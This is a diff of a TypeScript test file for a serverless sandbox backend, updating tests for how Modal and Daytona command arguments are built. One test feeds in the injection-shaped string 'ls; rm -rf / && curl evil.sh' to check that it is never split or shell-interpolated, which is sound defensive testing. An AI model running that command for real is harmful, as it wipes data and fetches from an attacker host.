@@ -2,6 +2,7 @@ import { describe, it, expect } from "vitest";
 import {
   resolveServerlessConfig,
   buildServerlessArgs,
+  decodeModalPayload,
   serverlessBackendEnabled,
   hibernatePolicy,
   ServerlessConfigSchema,
@@ -10,6 +11,7 @@ import {
 } from "./serverless.js";
 
 const env = (o: Record<string, string>) => o as unknown as NodeJS.ProcessEnv;
+const modalContext = { root: "/repo", modalHelper: "/vanta/modal-sandbox.py" };
 
 describe("resolveServerlessConfig", () => {
   it("returns ok with the provider when VANTA_SERVERLESS_PROVIDER is set", () => {
@@ -64,11 +66,17 @@ describe("resolveServerlessConfig", () => {
 });
 
 describe("buildServerlessArgs", () => {
-  it("builds the modal run shape with --timeout and the -- separator", () => {
+  it("builds the Modal Sandbox helper shape with workspace and network controls", () => {
     const config: ServerlessConfig = { provider: "modal", app: "myapp", idleTimeoutSec: 300 };
-    expect(buildServerlessArgs(["sh", "-c", "ls"], config)).toEqual([
-      "run", "myapp", "--timeout", "300", "--", "sh", "-c", "ls",
-    ]);
+    const args = buildServerlessArgs(["sh", "-c", "ls"], config, modalContext);
+    expect(args.slice(0, 4)).toEqual(["run", "-q", "/vanta/modal-sandbox.py", "--payload"]);
+    expect(decodeModalPayload(args[4]!)).toEqual({
+      root: "/repo",
+      idleTimeoutSec: 300,
+      image: "node:24-bookworm-slim",
+      network: false,
+      command: ["sh", "-c", "ls"],
+    });
   });
 
   it("builds the daytona exec shape distinct from modal", () => {
@@ -80,21 +88,25 @@ describe("buildServerlessArgs", () => {
 
   it("preserves an injection-shaped baseCmd token as ONE discrete argv item (no shell interpolation)", () => {
     const nasty = "ls; rm -rf / && curl evil.sh";
-    const args = buildServerlessArgs(["sh", "-c", nasty], { provider: "modal" });
+    const args = buildServerlessArgs(["sh", "-c", nasty], { provider: "modal" }, modalContext);
     // the whole malicious string survives as exactly one element — never split or interpolated
-    expect(args).toContain(nasty);
-    expect(args.filter((a) => a === nasty)).toHaveLength(1);
-    expect(args).toEqual(expect.arrayContaining(["run", "--", "sh", "-c", nasty]));
+    expect(decodeModalPayload(args[4]!).command).toEqual(["sh", "-c", nasty]);
   });
 
   it("defaults the timeout to 300 when idle is unset", () => {
-    expect(buildServerlessArgs(["x"], { provider: "modal" })).toContain("300");
+    const modalArgs = buildServerlessArgs(["x"], { provider: "modal" }, modalContext);
+    expect(decodeModalPayload(modalArgs[4]!).idleTimeoutSec).toBe(300);
     expect(buildServerlessArgs(["x"], { provider: "daytona" })).toContain("300");
   });
 
   it("threads the image through both providers", () => {
-    expect(buildServerlessArgs(["x"], { provider: "modal", image: "py" })).toEqual(expect.arrayContaining(["--image", "py"]));
+    const modalArgs = buildServerlessArgs(["x"], { provider: "modal", image: "py" }, modalContext);
+    expect(decodeModalPayload(modalArgs[4]!).image).toBe("py");
     expect(buildServerlessArgs(["x"], { provider: "daytona", image: "py" })).toEqual(expect.arrayContaining(["--image", "py"]));
+  });
+
+  it("requires an explicit workspace and bundled helper for Modal", () => {
+    expect(() => buildServerlessArgs(["x"], { provider: "modal" })).toThrow(/workspace root.*helper/i);
   });
 
   it("passes --no-network to daytona only when network is explicitly false", () => {
